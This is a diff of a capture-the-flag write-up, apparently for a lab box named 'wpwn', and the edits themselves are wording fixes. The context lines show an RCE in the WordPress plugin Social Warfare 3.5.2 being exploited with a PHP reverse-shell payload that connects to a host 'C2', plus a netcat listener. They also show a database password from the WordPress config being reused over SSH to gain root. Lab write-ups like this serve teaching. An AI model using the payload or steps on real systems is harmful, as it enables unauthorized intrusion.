@@ -152,7 +152,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:04
 ```
 If we have a closer look at the output we see that the plugin `social warfare 3.5.2` is used.  
-Searching for an exploit using `searchsploit` reveals the installed version is vulnerable to an `rce`.
+Searching for an exploit using `searchsploit` reveals that the installed version is vulnerable to an `rce`.
 
 ```bash
 $ searchsploit social warfare      
@@ -223,13 +223,13 @@ if __name__ == "__main__":
 ```
 
 ### exploitation
-Create a file shell.txt with the following content.
+Create a file `shell.txt` with the following content.
 
 ```
 <pre>system('php -r \'$sock=fsockopen("C2",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'')</pre>
 ```
 
-Now we start our netcat listener on the attacker machine.
+Now we start our `netcat` listener on the attacker machine.
 
 ```
 $ nc -lvp 1234
@@ -266,7 +266,7 @@ a*****************************d
 
 ## privilege escalation
 
-Having a closer look at the `wordpress` config file and which user exist on the system gives us an indication how to elevate our privileges.
+Having a closer look at the `wordpress` config file and which users exist on the system gives us an indication how to elevate our privileges.
 
 ```bash
 $ pwd
@@ -287,7 +287,7 @@ takis
 ```
 
 So we identified that the user `takis` exists and that the `wordpress` installation uses a complicated database password (`R3&]vzhHmMn9,:-5`).  
-It is worth a test to ssh into the machine with ```takis:R3&]vzhHmMn9,:-5```.
+It is worth a try to ssh into the machine with ```takis:R3&]vzhHmMn9,:-5```.
 
 ```bash
 ssh takis@192.168.55.123
@@ -310,6 +310,6 @@ proof.txt  root.txt
 root@wpwn:~# cat proof.txt 
 f****************************1
 ```
--> f****************************1  
+-> `f****************************1`  
   
 Pwned! <@:-)
